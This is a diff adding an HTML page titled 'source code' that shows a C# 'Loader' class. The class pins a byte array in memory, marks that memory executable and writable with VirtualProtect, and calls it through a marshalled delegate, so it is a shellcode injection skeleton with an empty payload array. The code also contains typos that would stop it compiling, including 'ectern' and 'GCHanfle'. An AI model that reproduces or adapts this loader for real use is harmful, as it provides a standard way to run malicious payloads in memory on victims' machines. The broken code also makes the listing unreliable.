@@ -1,0 +1,50 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>source code</title>
+</head><body><b><tt><span style="font-size: 14pt"><span style="font-family: Eras Bold ITC"><span style="background-color: #ffffff"><span style="color: #000000">using System;<br/>
+using System.Collection.Generic;<br/>
+using System.Linq;<br/>
+using System.Text;<br/>
+using System.Threading.Tasks;<br/>
+using System.Runtime.InteropServices;<br/>
+<br/>
+namespace Loader<br/>
+{<br/>
+<br/>
+  [ComVisible(true)]<br/>
+  public class Loader{<br/>
+    private delegate IntPtr SC();<br/>
+<br/>
+    [DllImport(&quot;kernel32.dll&quot;)]<br/>
+    <br/>
+    public static ectern Boolean VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);<br/>
+    <br/>
+    private void InjectPayload(byte[] shellcode)<br/>
+    {<br/>
+      //provide a way to access a managed object from unmanaged memory<br/>
+      GCHanfle gch = GCHandle.Alloc(shellcode, GCHandleType.Pinned);<br/>
+<br/>
+      //Shellcode is pinned to protect it from being moved by the garbage collector in memory<br/>
+      IntPtr ptr = gch.AddOfPinnedObject();<br/>
+      uint OldProtect;<br/>
+<br/>
+      // Change the protection to make the shellcode executable (0x40 = PAGE_EXECUTE_READWRITE)<br/>
+      if (VirtualProtect(ptr, (UIntPtr)shellcode.Length, 0x40, out OldProtect))<br/>
+      {<br/>
+        // Shellcode is executed using a mashalled delgate<br/>
+        SC sc = (SC)Marshal.GetDelegateForFunctionPointer(ptr, typeof(SC));<br/>
+        sc();<br/>
+      }<br/>
+    }<br/>
+<br/>
+    public Loader()<br/>
+    {<br/>
+      //shellcode will be stored here<br/>
+      byte[] shellcode = { };<br/>
+<br/>
+      //Inject and execute the shellcode<br/>
+      InjectPayload(shellcode);<br/>
+    }<br/>
+  }<br/>
+</span></span></span></span><span style="font-family: Eras Bold ITC"><span style="background-color: #ffffff"><span style="color: #000000"><span style="font-size: 14pt">}</span></span></span></span></tt></b></body></html>
